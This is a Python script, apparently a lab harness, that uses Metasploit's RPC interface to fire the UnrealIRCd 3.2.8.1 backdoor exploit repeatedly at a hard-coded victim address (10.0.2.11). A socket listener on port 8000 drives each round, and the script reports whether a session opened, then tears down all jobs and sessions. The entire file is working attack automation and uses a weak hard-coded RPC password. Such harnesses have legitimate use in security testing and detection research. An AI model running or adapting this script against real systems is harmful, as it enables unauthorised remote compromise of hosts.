from metasploit.msfrpc import MsfRpcClient
import socket
import time

client = MsfRpcClient('123456')
victim_ip = '10.0.2.11'
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_address = ('', 8000)

def stop_all_sessions():
	for session_id in client.sessions.list.keys():
		session = client.sessions.session(session_id)
		session.stop()

def stop_all_jobs():
	for job_id in client.jobs.list.keys():
		try:
			client.jobs.stop(job_id)
		except:
			pass

def get_exploit(name, extra_params = {}):
	explt = client.modules.use('exploit', name)
	explt['RHOST'] = victim_ip
	for key in extra_params.keys():
		explt[key] = extra_params[key]
	return explt

def exploit(explt, payload):
	res = explt.execute(payload = payload)
	if res['job_id'] == None:
		print("exploit failed (no job id)")
		return False
	print("have job id")
	if len(client.sessions.list) > 0:
		return True
	for i in range(7):
		time.sleep(0.5)
		if len(client.sessions.list) > 0:
			return True
	return False


if __name__ == '__main__':
	counter = 0
	i = 0
	explt = get_exploit('unix/irc/unreal_ircd_3281_backdoor')
	sock.bind(server_address)
	sock.listen(5)
	client_sock, addr = sock.accept()
	client_sock.sendall('ready')
	print("ready for round 0")
	while True:
		cmd = client_sock.recv(100)
		if cmd == 'start':
			print("   round " + str(counter) + ": starting exploit")
			payload = explt.payloads[i]
			# i = (i + 1) % 4;
			is_succeeded = exploit(explt, payload)
			print(("success" if is_succeeded else "failure") + " , payload = " + payload)
			stop_all_jobs()
			stop_all_sessions()
			client_sock.sendall('success' if is_succeeded else 'failure')
			client_sock.sendall('ready')
			counter += 1
			print("ready for round " + str(counter))
		elif cmd == 'stop':
			break
	client_sock.close()
	sock.close()